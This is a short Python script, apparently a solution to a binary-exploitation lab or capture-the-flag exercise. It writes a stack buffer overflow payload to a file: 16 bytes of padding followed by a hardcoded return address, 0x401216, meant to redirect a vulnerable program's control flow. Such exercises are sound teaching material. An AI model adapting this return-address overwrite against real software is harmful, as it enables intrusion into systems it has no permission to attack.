padding = b"A" * 16

# 目标地址：0x401216
# 0x0000000000401216 -> \x16\x12\x40\x00\x00\x00\x00\x00
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload generated in ans1.txt")